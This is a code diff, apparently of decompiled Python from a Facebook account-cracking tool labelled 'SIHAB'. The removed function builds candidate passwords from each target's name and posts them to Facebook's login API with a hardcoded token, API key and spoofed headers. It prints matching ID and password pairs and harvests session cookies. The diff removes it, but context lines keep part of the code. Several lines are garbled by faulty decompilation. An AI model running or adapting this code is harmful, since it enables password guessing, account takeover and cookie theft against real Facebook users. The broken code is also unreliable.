@@ -1466,15 +1466,6 @@ i['name'] + '=' + i['value']None)(po['session_cookies']())
         return None
         e = None
         del e
-
-
-def api3(ids, names, passlist):
-    global loop
-    sys.stdout.write(f'''\r\r\x1b[1;37m [SIHAB-M3] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
-    sys.stdout.flush()
-    fn = names.split(' ')[0]
-    ln = names.split(' ')[1]
-    for pw in passlist:
         pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
         accessToken = ('256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',)
         fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
@@ -1607,27 +1598,6 @@ def api3(ids, names, passlist):
             '210']
         li2 = random.choice(li)
         j1 = lambda :  
-random.choice(digits)None())
-        jazoest = li2 + j1
-        data = {
-            'api_key': '882a8490361da98702bf97a021ddc14d',
-            'access_token': '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
-            'sig': '4c854da0db9429f4913c2a1b221c1d30' }
-        headers = {
-            'X-Fb-Device-Group': '6060',
-            'X-Tigon-Is-Retry': 'False',
-            'X-Fb-Friendly-Name': 'authenticate',
-            'X-Fb-Request-Analytics-Tags': 'unknown',
-            'X-Fb-Http-Engine': 'Liger',
-            'X-Fb-Client-Ip': 'True',
-            'X-Fb-Server-Cluster': 'True',
-            'Content-Length': '2126' }
-        url = 'https://b-graph.facebook.com/auth/login'
-        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
-        po = requests.post(url, data = data, headers = headers).json()
-        if 'session_key' in po:
-            print('\r\r\x1b[1;32m [SIHAB-OK💚] ' + ids + ' | ' + pas + '')
-            get_coki = (lambda .0: for i in .0:
 i['name'] + '=' + i['value']None)(po['session_cookies']())
             compile_coki = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
             coki = f'''sb={compile_coki};{get_coki}'''
